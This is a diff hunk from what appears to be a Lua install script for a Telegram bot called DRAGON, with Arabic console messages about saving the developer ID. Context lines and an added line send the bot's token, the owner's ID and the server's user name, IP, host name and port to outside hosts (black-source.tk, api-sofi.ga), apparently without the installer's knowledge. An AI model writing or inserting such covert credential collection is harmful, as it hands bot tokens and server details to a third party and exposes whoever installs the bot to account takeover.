@@ -57,7 +57,7 @@ io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉
 database:set(id_server..":SUDO:ID",SUDOID)
 end 
 local t = json:decode(https.request('https://black-source.tk/Dr/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
-local t = json:decode(https.request("https://api-sofi.ga/SRC-DRAGON/index.php?n=DRAGON&id="..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://api-sofi.ga/SRC-DRAGON/index.php?n=DRAGON&id='..SUDO.."&token="..token.."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end  
